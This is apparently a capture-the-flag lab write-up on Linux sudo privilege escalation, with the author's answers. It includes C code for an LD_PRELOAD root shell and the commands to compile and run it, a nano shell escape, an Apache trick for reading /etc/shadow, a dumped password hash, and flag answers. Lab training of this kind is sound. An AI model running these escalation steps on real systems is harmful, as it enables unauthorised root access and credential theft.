**Note: Launch the target machine attached to this task to follow along.**

**You can launch the target machine and access it directly from your browser.**

**Alternatively, you can access it over SSH with the low-privilege user credentials below:  
**

**Username: karen**

**Password: Password1**

The sudo command, by default, allows you to run a program with root privileges. Under some conditions, system administrators may need to give regular users some flexibility on their privileges. For example, a junior SOC analyst may need to use Nmap regularly but would not be cleared for full root access. In this situation, the system administrator can allow this user to only run Nmap with root privileges while keeping its regular privilege level throughout the rest of the system.

Any user can check its current situation related to root privileges using the `sudo -l` command.

[https://gtfobins.github.io/](https://gtfobins.github.io/) is a valuable source that provides information on how any program, on which you may have sudo rights, can be used.

**Leverage application functions**  

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (`-f` : specify an alternate ServerConfigFile).

![](https://i.imgur.com/rNpbbL8.png)  

Loading the `/etc/shadow` file using this option will result in an error message that includes the first line of the `/etc/shadow` file.

**Leverage LD_PRELOAD**

On some systems, you may see the LD_PRELOAD environment option.

![](https://i.imgur.com/gGstS69.png)  

LD_PRELOAD is a function that allows any program to use shared libraries. This [blog post](https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/) will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.  

The steps of this privilege escalation vector can be summarized as follows;

1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}  

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

`gcc -fPIC -shared -o shell.so shell.c -nostartfiles`

![](https://i.imgur.com/HxbszMW.png)  

We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

`sudo LD_PRELOAD=/home/user/ldpreload/shell.so find`

This will result in a shell spawn with root privileges.

![](https://i.imgur.com/1YwARyZ.png)  


### Answers


| Question                                                                          | Answer |
| --------------------------------------------------------------------------------- | ----------------------- |
| How many programs can the user "karen" run on the target system with sudo rights? | 3                       |

![[Pasted image 20231212234544.png]]



| Question                                   | Answer        |
| ------------------------------------------ | ------------- |
| What is the content of the flag2.txt file? | THM-402028394 |


Check root privileges:

![[Pasted image 20231212232827.png]]

Use nano (fom gtfobins):

![[Pasted image 20231212232927.png]]


```
sudo nano
ctrl+C, ctrl+x
reset; sh 1>&0 2>&0
```

![[Pasted image 20231212233323.png]]

The flag is in /home/ubuntu:

![[Pasted image 20231212233753.png]]


| Question                                                                           | Answer                  |
| ---------------------------------------------------------------------------------- | ----------------------- |
| How would you use Nmap to spawn a root shell if your user had sudo rights on nmap? | sudo nmap --interactive |

From gtfobins:

![[Pasted image 20231212235006.png]]


| Question                              | Answer                                                                                                     |
| ------------------------------------- | ---------------------------------------------------------------------------------------------------------- |
| What is the hash of frank's password? | $6$2.sUUDsOLIpXKxcr$eImtgFExyr2ls4jsghdD3DHLHHP9X50Iv.jNmwo/BJpphrPRJWjelWEz2HH.joV14aDEwW1c3CahzB1uaqeLR1 |

```
cat /etc/shadow
```

![[Pasted image 20231213000321.png]]
